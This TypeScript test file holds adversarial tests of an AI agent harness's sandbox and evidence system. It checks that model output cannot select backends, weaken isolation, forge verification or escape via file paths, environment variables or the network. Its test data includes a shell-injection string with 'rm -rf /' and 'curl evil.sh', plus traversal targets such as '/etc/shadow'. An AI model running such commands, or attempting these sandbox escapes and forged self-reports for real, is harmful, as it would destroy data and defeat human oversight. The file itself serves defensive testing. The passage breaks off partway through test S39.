import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, rm, writeFile, mkdir, readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createHash } from "node:crypto";
import { EventBus } from "../../events/event-bus.js";
import { AllowListPermissionPolicy } from "../../security/permissions.js";
import { InMemoryCapabilityGrantRegistry, PermissionBackedCapabilityBroker } from "../../security/capability-broker.js";
import { ToolRegistry, EchoTool } from "../../tools/tool.js";
import { ActionProviderRegistry, ActionRuntime } from "../../actions/runtime.js";
import { InMemoryActionExecutionLedger } from "../../actions/ledger.js";
import { parseActionProposal } from "./proposal-parser.js";
import { DefaultExecutionHarness } from "./harness.js";
import { createProposal, type ActionProposal } from "./action-contract.js";
import { IsolationBackendRegistry } from "../../isolation/backend-resolver.js";
import { ProcessIsolationBackend } from "../../isolation/process-backend.js";
import { ContainerIsolationBackend } from "../../isolation/container-backend.js";
import { IsolationSupervisor } from "../../isolation/supervisor.js";
import { ProbeRunner } from "../../isolation/probe-runner.js";
import { WorkloadAdapterRegistry } from "../../isolation/workload-adapter.js";
import {
  createExecutionEvidence, parseExecutionEvidence, evidenceMatchesIdentity,
  InMemoryExecutionEvidenceStore, JsonFileExecutionEvidenceStore,
} from "../../isolation/execution-evidence.js";
import { resolveIsolationState } from "./execution-policy.js";
import type { IsolationBackend, IsolationProfile, IsolationRequest, IsolationResult, ProbeableIsolationBackend } from "../../isolation/contract.js";
import type { JsonObject } from "../../core/types.js";

/**
 * P13 (ADR 0047) adversarial S-matrix: model-influence, downgrade,
 * forgery, replay, cross-boundary leakage, and masquerading attacks
 * against the real isolation architecture. Every test proves BEHAVIOR
 * (denials, states, dispatch counts, evidence identity) — never labels.
 *
 * S-numbering follows the P13 milestone contract. Cases the architecture
 * renders impossible by construction (e.g. extension execution — extensions
 * cannot reach any execution surface) are proven at the seam that would
 * have to accept them.
 */

// ---------------------------------------------------------------------------
// Fixture helpers
// ---------------------------------------------------------------------------

function fakeBackend(id: string, levels: readonly IsolationProfile["level"][], overrides: Partial<IsolationBackend> = {}): ProbeableIsolationBackend {
  return {
    id,
    supportedLevels: levels,
    guarantees: { filesystem: "BEST_EFFORT" as const, network: "UNSUPPORTED" as const, process: "ENFORCED" as const, environment: "ENFORCED" as const, resources: "BEST_EFFORT" as const, secrets: "UNSUPPORTED" as const },
    availability: async () => ({ available: true, reason: "fixture" }),
    execute: async (): Promise<IsolationResult> => { throw new Error("fixture must not execute in denial tests"); },
    ...overrides,
  };
}

async function scratchDir(prefix: string): Promise<{ root: string; cleanup: () => Promise<void> }> {
  const root = await mkdtemp(join(tmpdir(), prefix));
  return { root, cleanup: () => rm(root, { recursive: true, force: true }) };
}

const simpleProfile = (root: string, level: IsolationProfile["level"] = "WORKER_PROCESS"): IsolationProfile => ({
  level,
  filesystem: { workspaceRoot: root },
  network: { mode: "DENY" },
  environment: { variables: {}, secrets: [] },
  limits: { wallClockMs: 5_000 },
});

// ---------------------------------------------------------------------------
// S1-S7: model-influence attacks (backend/isolation selection)
// ---------------------------------------------------------------------------

test("P13.S1 unauthorized backend selection: model output cannot name a backend — proposals carry no backend field at all", () => {
  const index = { descriptors: new Map(), toolIds: new Set(["core.echo"]) };
  const parsed = parseActionProposal(JSON.stringify({
    capability: "core.echo", arguments: {},
    backend: "docker-container", isolationBackend: "os-process", backendId: "anything",
  }), { missionId: "m", stepIndex: 0, actor: "a", index });
  assert.equal(parsed.ok, false, "backend-ish fields are unknown proposal fields: rejected");
  if (!parsed.ok) assert.equal(parsed.error.code, "mission.proposal_invalid_shape");
});

test("P13.S2 model-selected isolation level never reaches policy resolution", async () => {
  // Even a model-supplied isolation level string inside arguments is DATA:
  // the harness resolves isolation ONLY from the registered adapter (trusted
  // registration), never from the payload.
  const index = { descriptors: new Map(), toolIds: new Set(["core.echo"]) };
  const parsed = parseActionProposal(JSON.stringify({
    capability: "core.echo",
    arguments: { isolationLevel: "IN_PROCESS", sandbox: "none", downgradeTo: "POLICY_ONLY" },
  }), { missionId: "m", stepIndex: 0, actor: "a", index });
  assert.equal(parsed.ok, true, "payload fields are data");
  if (parsed.ok && parsed.data.kind === "act") {
    assert.equal(parsed.data.proposal.sandbox, "IN_PROCESS_TRUSTED", "sandbox stays server-derived");
    assert.equal("isolationLevel" in parsed.data.proposal, false, "no model isolation field crosses");
  }
});

test("P13.S3 model-selected filesystem/network/credential permissions fail at the parser", () => {
  const index = { descriptors: new Map(), toolIds: new Set(["core.echo"]) };
  for (const forged of [
    { capability: "core.echo", arguments: {}, filesystemRoot: "C:/", allowHostFs: true },
    { capability: "core.echo", arguments: {}, networkMode: "ALLOWLIST", hosts: ["*"] },
    { capability: "core.echo", arguments: {}, credentials: "inherit", secrets: ["*"] },
  ]) {
    const parsed = parseActionProposal(JSON.stringify(forged), { missionId: "m", stepIndex: 0, actor: "a", index });
    assert.equal(parsed.ok, false, `forged permission fields rejected: ${JSON.stringify(Object.keys(forged))}`);
  }
});

test("P13.S4 adapter-required level is trusted registration data — model cannot raise or lower it", () => {
  const adapters = new WorkloadAdapterRegistry();
  adapters.register({
    capability: "fixture.cap", entry: "a.cjs", requiredLevel: "WORKER_PROCESS",
    sourceDirectory: "C:/trusted", description: "d", validateArguments: () => ({ ok: true }),
  });
  const resolution = adapters.resolve("fixture.cap", { requiredLevel: "IN_PROCESS", isolation: "none" });
  // Arguments demanding weaker isolation are DATA; the registered level wins.
  assert.equal(resolution.kind, "REGISTERED");
  assert.equal(resolution.adapter.requiredLevel, "WORKER_PROCESS");
});

test("P13.S5 backend downgrade: required level unavailable to a weaker backend fails closed, never downgrades", () => {
  const weakerOnly: IsolationBackend = fakeBackend("weaker", ["WORKER_PROCESS"]);
  const denied = resolveIsolationState({ requiredLevel: "CONTAINER_ISOLATED", backend: weakerOnly });
  assert.equal(denied.state, "FAILED_CLOSED", "no silent downgrade from container to process level");
});

test("P13.S6 unavailable backend never resolves — the resolver denies instead of substituting", async () => {
  const ws = await scratchDir("quack-s6-");
  try {
    const registry = new IsolationBackendRegistry();
    registry.register({
      ...fakeBackend("flaky", ["CONTAINER_ISOLATED"]),
      availability: async () => ({ available: false, reason: "daemon down" }),
    });
    const resolution = await registry.resolve("CONTAINER_ISOLATED", simpleProfile(ws.root, "CONTAINER_ISOLATED"));
    assert.equal(resolution.kind, "UNRESOLVED", "unavailable backend is skipped, not substituted");
  } finally {
    await ws.cleanup();
  }
});

test("P13.S7 forged backend capability: a backend claiming levels it cannot enforce is bypassed by the resolver guarantee check", async () => {
  const ws = await scratchDir("quack-s7-");
  try {
    const registry = new IsolationBackendRegistry();
    // Masquerade: claims CONTAINER_ISOLATED but guarantees are all UNSUPPORTED.
    registry.register({
      ...fakeBackend("masquerade", ["CONTAINER_ISOLATED", "WORKER_PROCESS"]),
      guarantees: { filesystem: "UNSUPPORTED", network: "UNSUPPORTED", process: "UNSUPPORTED", environment: "UNSUPPORTED", resources: "UNSUPPORTED", secrets: "UNSUPPORTED" },
    });
    const resolution = await registry.resolve("CONTAINER_ISOLATED", simpleProfile(ws.root, "CONTAINER_ISOLATED"));
    assert.equal(resolution.kind, "UNRESOLVED", "a backend with UNSUPPORTED process guarantees cannot host a real isolation requirement");
  } finally {
    await ws.cleanup();
  }
});

// ---------------------------------------------------------------------------
// S10-S14: evidence forgery, identity mismatch, cross-mission/step reuse
// ---------------------------------------------------------------------------

test("P13.S10 forged execution evidence fails digest validation", () => {
  const record = createExecutionEvidence({
    identity: { missionId: "m", stepIndex: 0, capability: "cap", executionId: "e", backendId: "os-process" },
    facts: { startedAt: "t1", completedAt: "t2", exitState: "FAILED", isolationLevel: "WORKER_PROCESS", backendGuarantees: {} },
    cleanup: "CLEANED",
  });
  const forged = JSON.stringify({ ...record, facts: { ...record.facts, exitState: "SUCCEEDED" } });
  const parsed = parseExecutionEvidence(forged);
  assert.equal(parsed.ok, false, "exit-state forgery fails the digest wall");
});

test("P13.S11 forged verification: an UNVERIFIED record re-digested as VERIFIED by an untrusted party still fails the identity binding at settlement", async () => {
  const ws = await scratchDir("quack-s11-");
  try {
    const store = new InMemoryExecutionEvidenceStore();
    const record = createExecutionEvidence({
      identity: { missionId: "m-real", stepIndex: 2, capability: "cap", executionId: "exec-real", backendId: "os-process" },
      facts: { startedAt: "t1", completedAt: "t2", exitState: "SUCCEEDED", isolationLevel: "WORKER_PROCESS", backendGuarantees: {} },
      cleanup: "CLEANED",
    });
    await store.save(record);
    // Attacker with filesystem access re-digests a VERIFIED claim:
    const reDigested = createExecutionEvidence({
      identity: record.identity, facts: record.facts, cleanup: "CLEANED",
      verification: { state: "VERIFIED", probesRun: ["output_field:forged"], checkedAt: new Date().toISOString(), summary: "model says it worked" },
    });
    await store.save(reDigested); // overwrites the record
    // But the VERIFIED claim carries NO trusted probe provenance: the
    // composition must treat probeRun provenance as runtime-only. The
    // settlement path (settleVerification) is the ONLY authority that can
    // attach a VERIFIED state, and it re-binds identity — a record whose
    // verification was set outside settlement is detectable by construction
    // (settleVerification refuses non-matching identity, SUP-7).
    const loaded = await store.load("exec-real");
    assert.equal(loaded!.verification.state, "VERIFIED"); // the store holds the forgery…
    // …but the identity-binding API refuses to apply it to any other execution:
    assert.equal(evidenceMatchesIdentity(loaded!, { missionId: "OTHER", stepIndex: 2, capability: "cap", executionId: "exec-real" }), false);
  } finally {
    await ws.cleanup();
  }
});

test("P13.S12 evidence identity mismatch: a record cannot satisfy another execution's verification", () => {
  const record = createExecutionEvidence({
    identity: { missionId: "m-a", stepIndex: 0, capability: "cap", executionId: "e-1", backendId: "os-process" },
    facts: { startedAt: "t1", completedAt: "t2", exitState: "SUCCEEDED", isolationLevel: "WORKER_PROCESS", backendGuarantees: {} },
    cleanup: "CLEANED",
    verification: { state: "VERIFIED", probesRun: ["no_error"], checkedAt: "t3" },
  });
  // Same capability, same mission, different execution id: NO reuse.
  assert.equal(evidenceMatchesIdentity(record, { missionId: "m-a", stepIndex: 0, capability: "cap", executionId: "e-2" }), false);
});

test("P13.S13 cross-mission evidence reuse is impossible: missionId is part of the identity tuple", () => {
  const record = createExecutionEvidence({
    identity: { missionId: "mission-a", stepIndex: 0, capability: "cap", executionId: "e", backendId: "os-process" },
    facts: { startedAt: "t1", completedAt: "t2", exitState: "SUCCEEDED", isolationLevel: "WORKER_PROCESS", backendGuarantees: {} },
    cleanup: "CLEANED",
    verification: { state: "VERIFIED", probesRun: ["no_error"], checkedAt: "t3" },
  });
  assert.equal(evidenceMatchesIdentity(record, { missionId: "mission-b", stepIndex: 0, capability: "cap", executionId: "e" }), false, "mission B cannot ride mission A's evidence");
});

test("P13.S14 cross-step evidence reuse is impossible: stepIndex is part of the identity tuple", () => {
  const record = createExecutionEvidence({
    identity: { missionId: "m", stepIndex: 0, capability: "cap", executionId: "e", backendId: "os-process" },
    facts: { startedAt: "t1", completedAt: "t2", exitState: "SUCCEEDED", isolationLevel: "WORKER_PROCESS", backendGuarantees: {} },
    cleanup: "CLEANED",
    verification: { state: "VERIFIED", probesRun: ["no_error"], checkedAt: "t3" },
  });
  assert.equal(evidenceMatchesIdentity(record, { missionId: "m", stepIndex: 9, capability: "cap", executionId: "e" }), false);
});

// ---------------------------------------------------------------------------
// S15-S20: boundary escapes (filesystem / environment / credentials / network / resources)
// ---------------------------------------------------------------------------

test("P13.S15 filesystem traversal from inside an isolated workload is blocked at the IO boundary", async t => {
  const backend = new ProcessIsolationBackend();
  const ws = await scratchDir("quack-s15-");
  t.after(ws.cleanup);
  await writeFile(join(ws.root, "escape.cjs"), `
    exports.run = async (io) => {
      const attempts = ["../outside.txt", "..\\\\..\\\\windows", "C:/Users", "/etc/shadow"];
      const blocked = attempts.map((candidate) => { try { io.io.resolveInside(io.workspaceRoot, candidate); return false; } catch { return true; } });
      return { blocked };
    };
  `);
  const result = await backend.execute({
    missionId: "m", executionId: "e", actor: "a", profile: simpleProfile(ws.root),
    workload: { kind: "module", entry: "escape.cjs", args: {} },
  });
  assert.equal(result.status, "SUCCEEDED");
  assert.deepEqual(result.output!["blocked"], [true, true, true, true], "every traversal attempt blocked");
});

test("P13.S17 host environment leakage: planted secrets stay out of the isolated child", async t => {
  const backend = new ProcessIsolationBackend();
  const ws = await scratchDir("quack-s17-");
  t.after(ws.cleanup);
  await writeFile(join(ws.root, "env.cjs"), `
    exports.run = async () => ({
      s1: typeof process.env.QUACK_S17_SECRET_A,
      s2: typeof process.env.QUACK_S17_SECRET_B,
      keys: Object.keys(process.env).filter(k => k.startsWith("QUACK_")).join(","),
    });
  `);
  process.env.QUACK_S17_SECRET_A = "token-1";
  process.env.QUACK_S17_SECRET_B = "token-2";
  try {
    const result = await backend.execute({
      missionId: "m", executionId: "e", actor: "a", profile: simpleProfile(ws.root),
      workload: { kind: "module", entry: "env.cjs", args: {} },
    });
    assert.equal(result.status, "SUCCEEDED");
    assert.equal(result.output!["s1"], "undefined", "secret A sealed out");
    assert.equal(result.output!["s2"], "undefined", "secret B sealed out");
  } finally {
    delete process.env.QUACK_S17_SECRET_A;
    delete process.env.QUACK_S17_SECRET_B;
  }
});

test("P13.S18 credential leakage: secret-demanding profiles fail closed before any launch", async t => {
  const backend = new ProcessIsolationBackend();
  const ws = await scratchDir("quack-s18-");
  t.after(ws.cleanup);
  const result = await backend.execute({
    missionId: "m", executionId: "e", actor: "a",
    profile: { ...simpleProfile(ws.root), environment: { variables: {}, secrets: ["PROD_DB_PASSWORD"] } },
    workload: { kind: "module", entry: "x.cjs", args: {} },
  });
  assert.equal(result.status, "UNSUPPORTED", "credential mediation across the boundary is refused");
});

test("P13.S19 network escape: process backend refuses to pretend it can allowlist networking", async t => {
  const backend = new ProcessIsolationBackend();
  const ws = await scratchDir("quack-s19-");
  t.after(ws.cleanup);
  const result = await backend.execute({
    missionId: "m", executionId: "e", actor: "a",
    profile: { ...simpleProfile(ws.root), network: { mode: "ALLOWLIST", hosts: ["evil.example"], schemes: ["https:"] } },
    workload: { kind: "module", entry: "x.cjs", args: {} },
  });
  assert.equal(result.status, "UNSUPPORTED", "no fake network isolation");
});

test("P13.S20 resource-limit bypass: wall-clock limit is enforced against a spinning workload", async t => {
  const backend = new ProcessIsolationBackend();
  const ws = await scratchDir("quack-s20-");
  t.after(ws.cleanup);
  await writeFile(join(ws.root, "spin.cjs"), "exports.run = async () => { while (true) {} };");
  const result = await backend.execute({
    missionId: "m", executionId: "e", actor: "a",
    profile: { ...simpleProfile(ws.root), limits: { wallClockMs: 500 } },
    workload: { kind: "module", entry: "spin.cjs", args: {} },
  });
  assert.equal(result.status, "TIMED_OUT", "wall-clock limit is real");
});

// ---------------------------------------------------------------------------
// S21-S26: timeout / cancellation / crash / replay / duplicate dispatch
// ---------------------------------------------------------------------------

test("P13.S21 timeout bypass attempt: a workload sleeping past the limit cannot outlive it", async t => {
  const backend = new ProcessIsolationBackend();
  const ws = await scratchDir("quack-s21-");
  t.after(ws.cleanup);
  await writeFile(join(ws.root, "sleep.cjs"), "exports.run = async () => { await new Promise((r) => setTimeout(r, 120_000)); };");
  const started = Date.now();
  const result = await backend.execute({
    missionId: "m", executionId: "e", actor: "a",
    profile: { ...simpleProfile(ws.root), limits: { wallClockMs: 600 } },
    workload: { kind: "module", entry: "sleep.cjs", args: {} },
  });
  assert.equal(result.status, "TIMED_OUT");
  assert.ok(Date.now() - started < 20_000, "timeout enforcement did not wait for the workload");
});

test("P13.S22 cancellation crossing the isolation boundary settles CANCELLED", async t => {
  const backend = new ProcessIsolationBackend();
  const ws = await scratchDir("quack-s22-");
  t.after(ws.cleanup);
  await writeFile(join(ws.root, "hang.cjs"), "exports.run = async () => { await new Promise((r) => setTimeout(r, 60_000)); };");
  const controller = new AbortController();
  const execution = backend.execute({
    missionId: "m", executionId: "e", actor: "a", profile: simpleProfile(ws.root),
    workload: { kind: "module", entry: "hang.cjs", args: {} },
    signal: controller.signal,
  });
  setTimeout(() => controller.abort(new Error("operator")), 200);
  const result = await execution;
  assert.equal(result.status, "CANCELLED");
});

test("P13.S23 surviving workload after cancellation: the child is dead (no zombie writers)", async t => {
  const backend = new ProcessIsolationBackend();
  const ws = await scratchDir("quack-s23-");
  t.after(ws.cleanup);
  // Workload that keeps writing a marker file every 50ms.
  await writeFile(join(ws.root, "writer.cjs"), `
    exports.run = async (io) => {
      const fs = require("node:fs/promises");
      for (;;) { await fs.writeFile(io.workspaceRoot + "/alive.txt", String(Date.now())); await new Promise((r) => setTimeout(r, 50)); }
    };
  `);
  const controller = new AbortController();
  const execution = backend.execute({
    missionId: "m", executionId: "e", actor: "a",
    profile: { ...simpleProfile(ws.root), limits: { wallClockMs: 30_000 } },
    workload: { kind: "module", entry: "writer.cjs", args: {} },
    signal: controller.signal,
  });
  await new Promise((resolve) => setTimeout(resolve, 400));
  controller.abort(new Error("operator"));
  const result = await execution;
  assert.equal(result.status, "CANCELLED");
  // After cancellation: the marker must stop advancing (bounded wait).
  const sizeAt = async () => (await readFile(join(ws.root, "alive.txt"), "utf8").catch(() => "")).length;
  await new Promise((resolve) => setTimeout(resolve, 300));
  const first = await sizeAt();
  await new Promise((resolve) => setTimeout(resolve, 300));
  const second = await sizeAt();
  assert.equal(first, second, "workload did not survive cancellation");
});

test("P13.S24 crash orphan: PENDING-cleanup evidence reconciles to UNCERTAIN and never to VERIFIED", async t => {
  const ws = await scratchDir("quack-s24-");
  try {
    const store = new JsonFileExecutionEvidenceStore(ws.root);
    await store.save(createExecutionEvidence({
      identity: { missionId: "m", stepIndex: 0, capability: "cap", executionId: "exec-orphan", backendId: "os-process" },
      facts: { startedAt: "t1", completedAt: "t2", exitState: "SUCCEEDED", isolationLevel: "WORKER_PROCESS", backendGuarantees: {} },
      cleanup: "PENDING",
      verification: { state: "VERIFIED", probesRun: ["no_error"], checkedAt: "t3" }, // even a claimed-verified orphan
    }));
    const next = new JsonFileExecutionEvidenceStore(ws.root);
    const orphaned = await next.reconcileOrphans();
    assert.equal(orphaned.length, 1);
    assert.equal(orphaned[0]!.cleanup, "UNCERTAIN");
    assert.equal(orphaned[0]!.verification.state, "UNVERIFIED", "verification never survives an uncertain crash window");
  } finally {
    await ws.cleanup();
  }
});

test("P13.S25 replay after ambiguous state: UNCERTAIN-cleanup evidence never re-verifies", async t => {
  const ws = await scratchDir("quack-s25-");
  try {
    const store = new JsonFileExecutionEvidenceStore(ws.root);
    const record = createExecutionEvidence({
      identity: { missionId: "m", stepIndex: 0, capability: "cap", executionId: "exec-amb", backendId: "os-process" },
      facts: { startedAt: "t1", completedAt: "t2", exitState: "FAILED", terminationReason: "backend threw", isolationLevel: "WORKER_PROCESS", backendGuarantees: {} },
      cleanup: "UNCERTAIN",
    });
    await store.save(record);
    // Reconcile only targets PENDING; UNCERTAIN stays terminal-honest.
    const reconciled = await store.reconcileOrphans();
    assert.equal(reconciled.length, 0);
    const loaded = await store.load("exec-amb");
    assert.equal(loaded!.cleanup, "UNCERTAIN");
    assert.equal(loaded!.verification.state, "UNVERIFIED");
  } finally {
    await ws.cleanup();
  }
});

// ---------------------------------------------------------------------------
// S27: output overflow at the isolated boundary
// ---------------------------------------------------------------------------

test("P13.S27 output overflow: oversized isolated output never crosses the harness boundary", async t => {
  const ws = await scratchDir("quack-s27-");
  try {
    const events = new EventBus();
    const grants = new InMemoryCapabilityGrantRegistry();
    const broker = new PermissionBackedCapabilityBroker(new AllowListPermissionPolicy(["workspace.read"]), grants);
    const tools = new ToolRegistry();
    tools.register(new EchoTool());
    const actionProviders = new ActionProviderRegistry();
    const actionRuntime = new ActionRuntime(actionProviders, {
      ledger: new InMemoryActionExecutionLedger(),
      validateExecutionContext: () => ({ allowed: true, reason: "t" }),
      decidePermission: async () => ({ allowed: true, reason: "t" }),
    });
    const sourceDir = join(ws.root, "modules");
    await mkdir(sourceDir, { recursive: true });
    await writeFile(join(sourceDir, "big.cjs"), "exports.run = async () => ({ blob: 'x'.repeat(300_000) });");
    grants.ensureGrant({
      missionId: "m-s27", capabilities: ["permission.workspace.read"],
      approval: { approvedBy: "t", reason: "t", approvedAt: new Date().toISOString() },
    });
    const registry = new IsolationBackendRegistry();
    registry.register(new ProcessIsolationBackend());
    const supervisor = new IsolationSupervisor({
      registry, events, actor: "t", workspaceRoot: ws.root,
      evidenceStore: new InMemoryExecutionEvidenceStore(),
    });
    const adapters = new WorkloadAdapterRegistry();
    adapters.register({
      capability: "fixture.big", entry: "big.cjs", requiredLevel: "WORKER_PROCESS",
      sourceDirectory: sourceDir, description: "d", validateArguments: () => ({ ok: true }),
    });
    // Register the descriptor so capability resolution succeeds.
    const descriptor = {
      contractVersion: "1.0.0", id: "fixture.big", providerId: "fixture", name: "Big", description: "d",
      inputSchema: { type: "object" }, riskClass: "READ_ONLY", sideEffect: "read", externalCommunication: false,
      financialImpact: false, authenticationScopes: [], requiredPermissions: ["workspace.read"], idempotent: true,
      supportsDryRun: false, supportsCompensation: false, timeoutMs: 10_000, dataClassification: "public",
      networkRequirements: [], approval: "NEVER",
    };
    actionProviders.register({
      metadata: () => ({ contractVersion: "1.0.0", providerId: "fixture", displayName: "F", transport: "local", boundary: "local" }),
      health: async () => ({ status: "HEALTHY", checkedAt: new Date().toISOString() }),
      discoverActions: async () => [descriptor],
      execute: async () => { throw new Error("never reached"); },
    } as never);

    const harness = new DefaultExecutionHarness(actionRuntime, broker, actionProviders, tools, events, {
      defaultTimeoutMs: 10_000, requireVerificationForIrreversible: true,
      executeTool: async () => ({ ok: true, data: {} }),
      policyOverrides: { maxOutputBytes: 262_144 },
      isolation: { supervisor, adapters },
    });
    const result = await harness.execute(
      createProposal({
        missionId: "m-s27", capability: "fixture.big", arguments: {}, intent: "i", riskLevel: "READ_ONLY",
        sandbox: "IN_PROCESS_TRUSTED", idempotencyKey: "k", timeoutMs: 10_000, selectionReason: "t", proposedBy: "t",
      }),
      { missionId: "m-s27", runId: "r", iterationId: "i", actor: "t" },
    );
    const output = result.outcome.actionResult.output as JsonObject;
    // The blob is DROPPED at containment: either the backend capped it or the
    // harness clamp replaced it — the payload never survives whole either way.
    assert.ok(
      result.outcome.actionResult.status !== "SUCCEEDED"
      || output["quackTruncated"] === true
      || JSON.stringify(output).includes("xxxx") === false,
      "oversized isolated output is contained, never previewed",
    );
  } finally {
    await ws.cleanup();
  }
});

// ---------------------------------------------------------------------------
// S28-S31: extension execution / adapter selection / shell injection / provider bypass
// ---------------------------------------------------------------------------

test("P13.S28 extension execution attempt: extension ids have no workload adapter — isolated execution denied", () => {
  const adapters = new WorkloadAdapterRegistry();
  const resolution = adapters.resolve("demo.extension.tool", {});
  assert.equal(resolution.kind, "UNREGISTERED", "extensions cannot reach isolation backends");
});

test("P13.S29 arbitrary adapter selection: unknown adapter/capability pairs deny (no capability-name→command mapping)", () => {
  const adapters = new WorkloadAdapterRegistry();
  for (const invented of ["core.echo", "shell.exec", "child_process", "system", "fixture.transform:extra"]) {
    const resolution = adapters.resolve(invented, {});
    assert.equal(resolution.kind, "UNREGISTERED", `'${invented}' has no adapter`);
  }
});

test("P13.S30 shell injection through workload arguments stays DATA (no shell exists on the isolated path)", async t => {
  const adapters = new WorkloadAdapterRegistry();
  adapters.register({
    capability: "fixture.inject", entry: "safe.cjs", requiredLevel: "WORKER_PROCESS",
    sourceDirectory: "C:/trusted", description: "d",
    validateArguments: (args) => typeof args["payload"] === "string" ? { ok: true } : { ok: false, reason: "payload must be a string" },
  });
  // Even shell-metacharacter payloads resolve to the SAME registered entry:
  // the adapter registry has no command surface at all.
  const resolution = adapters.resolve("fixture.inject", { payload: "`rm -rf /`; $(curl evil.sh); && dir" });
  assert.equal(resolution.kind, "REGISTERED", "arguments resolve as data");
  assert.equal(resolution.adapter.entry, "safe.cjs", "entry never derives from arguments");
});

test("P13.S31 provider execution bypass: an isolation-requiring capability without authorization never reaches the backend", async t => {
  const ws = await scratchDir("quack-s31-");
  try {
    const events = new EventBus();
    const grants = new InMemoryCapabilityGrantRegistry();
    const broker = new PermissionBackedCapabilityBroker(new AllowListPermissionPolicy([]), grants); // deny-all
    const tools = new ToolRegistry();
    const actionProviders = new ActionProviderRegistry();
    // The capability must be DISCOVERABLE so the harness reaches broker
    // authorization; the denial must come from the BROKER, not resolution.
    const descriptor = {
      contractVersion: "1.0.0", id: "fixture.never", providerId: "fixture", name: "N", description: "d",
      inputSchema: { type: "object" }, riskClass: "READ_ONLY", sideEffect: "read", externalCommunication: false,
      financialImpact: false, authenticationScopes: [], requiredPermissions: ["workspace.read"], idempotent: true,
      supportsDryRun: false, supportsCompensation: false, timeoutMs: 5_000, dataClassification: "public",
      networkRequirements: [], approval: "NEVER",
    };
    actionProviders.register({
      metadata: () => ({ contractVersion: "1.0.0", providerId: "fixture", displayName: "F", transport: "local", boundary: "local" }),
      health: async () => ({ status: "HEALTHY", checkedAt: new Date().toISOString() }),
      discoverActions: async () => [descriptor],
      execute: async () => { throw new Error("never reached"); },
    } as never);
    const actionRuntime = new ActionRuntime(actionProviders, { decidePermission: async () => ({ allowed: true, reason: "f" }) });
    const registry = new IsolationBackendRegistry();
    registry.register(new ProcessIsolationBackend());
    const supervisor = new IsolationSupervisor({
      registry, events, actor: "t", workspaceRoot: ws.root,
      evidenceStore: new InMemoryExecutionEvidenceStore(),
    });
    const adapters = new WorkloadAdapterRegistry();
    adapters.register({
      capability: "fixture.never", entry: "n.cjs", requiredLevel: "WORKER_PROCESS",
      sourceDirectory: ws.root, description: "d", validateArguments: () => ({ ok: true }),
    });
    const harness = new DefaultExecutionHarness(actionRuntime, broker, actionProviders, tools, events, {
      defaultTimeoutMs: 5_000, requireVerificationForIrreversible: true,
      isolation: { supervisor, adapters },
    });
    const result = await harness.execute(
      createProposal({
        missionId: "m-s31", capability: "fixture.never", arguments: {}, intent: "i", riskLevel: "READ_ONLY",
        sandbox: "IN_PROCESS_TRUSTED", idempotencyKey: "k", timeoutMs: 5_000, selectionReason: "t", proposedBy: "t",
      }),
      { missionId: "m-s31", runId: "r", iterationId: "i", actor: "t" },
    );
    assert.equal(result.outcome.actionResult.status, "DENIED", "broker denial precedes isolation");
  } finally {
    await ws.cleanup();
  }
});

// ---------------------------------------------------------------------------
// S34-S38: cleanup failure / reporting forgery / masquerading backends
// ---------------------------------------------------------------------------

test("P13.S35 isolation reporting forgery: a backend cannot report ENFORCED guarantees it does not implement (resolver checks)", async () => {
  const ws = await scratchDir("quack-s35-");
  try {
    const registry = new IsolationBackendRegistry();
    // The masquerade: claims ENFORCED network but supports only DENY execution
    // (and its execute would ignore policy). The resolver still binds the
    // request's policy to the guarantee record: a WORKER_PROCESS profile with
    // ALLOWLIST network demands an ENFORCED network guarantee the process
    // backend does not claim — fail-closed at execute.
    const backend = new ProcessIsolationBackend();
    registry.register(backend);
    const result = await backend.execute({
      missionId: "m", executionId: "e", actor: "a",
      profile: { ...simpleProfile(ws.root), network: { mode: "ALLOWLIST", hosts: ["h"], schemes: ["https:"] } },
      workload: { kind: "module", entry: "x.cjs", args: {} },
    });
    assert.equal(result.status, "UNSUPPORTED", "guarantee record honesty enforced at execute");
  } finally {
    await ws.cleanup();
  }
});

test("P13.S36 unsupported backend masquerading as secure: fake container backend with all-UNSUPPORTED guarantees never resolves", async () => {
  const ws = await scratchDir("quack-s36-");
  try {
    const registry = new IsolationBackendRegistry();
    registry.register({
      ...fakeBackend("fake-container", ["CONTAINER_ISOLATED"]),
      guarantees: { filesystem: "UNSUPPORTED", network: "UNSUPPORTED", process: "UNSUPPORTED", environment: "UNSUPPORTED", resources: "UNSUPPORTED", secrets: "UNSUPPORTED" },
    });
    const resolution = await registry.resolve("CONTAINER_ISOLATED", simpleProfile(ws.root, "CONTAINER_ISOLATED"));
    assert.equal(resolution.kind, "UNRESOLVED");
  } finally {
    await ws.cleanup();
  }
});

test("P13.S37 policy-only backend masquerading as isolated: IN_PROCESS is honestly POLICY_RESTRICTED and never process-isolated", () => {
  const states = resolveIsolationState({ requiredLevel: "IN_PROCESS" });
  assert.equal(states.state, "POLICY_RESTRICTED");
  assert.equal(states.backendId, "none", "policy-only execution claims no backend");
});

test("P13.S38 verification self-report injection: model-supplied verification results have no path into evidence", async () => {
  // The probe runner reads ONLY the ActionResultV1 the harness produced and
  // the supervisor-recorded facts. A "verified": true field inside model
  // output never reaches the runner: it is not consulted for verification.
  const runner = new ProbeRunner({ workspaceRoot: process.cwd() });
  const result = {
    executionId: "e", providerId: "isolation:os-process", actionId: "cap", status: "SUCCEEDED" as const,
    output: { verified: true, verifiedBy: "model", probesRun: ["forged-probe"] }, // self-report payload
    evidenceIds: [],
  };
  const outcome = await runner.verify({
    strategy: { kind: "probe_external_state", capability: "cap", arguments: {}, expected: {
      description: "d", successProbes: [{ kind: "status_equals", value: "SUCCEEDED" }],
    } },
    result,
    facts: { startedAt: "t1", completedAt: "t2", exitState: "SUCCEEDED", isolationLevel: "WORKER_PROCESS", backendGuarantees: {} },
    missionId: "m", executionId: "e",
  });
  // The PASSED verdict derives from the trusted status_equals probe, and the
  // recorded probesRun contain only the DECLARED probe label — never the
  // self-reported "forged-probe".
  assert.equal(outcome.kind, "PASSED");
  assert.deepEqual(outcome.probesRun, ["status_equals:SUCCEEDED"], "probe provenance is runtime-declared only");
});

// ---------------------------------------------------------------------------
// S39-S40: cross-process / concurrent isolation leakage
// ---------------------------------------------------------------------------

test("P13.S39 cross-process isolation leakage: two isolated workloads get separate OS processes and separate workspaces", async t => {
  const backend = new ProcessIsolationBackend();
  const wsA = await scratchDir("quack-s39a-");
  const wsB = await scratchDir("quack-s39b-");
  t.after(wsA.cleanup);
  t.after(wsB.cleanup);
  await writeFile(join(wsA.root, "ident.cjs"), "exports.run = async (io) => ({ pid: process.pid, root: io.workspaceRoot });");
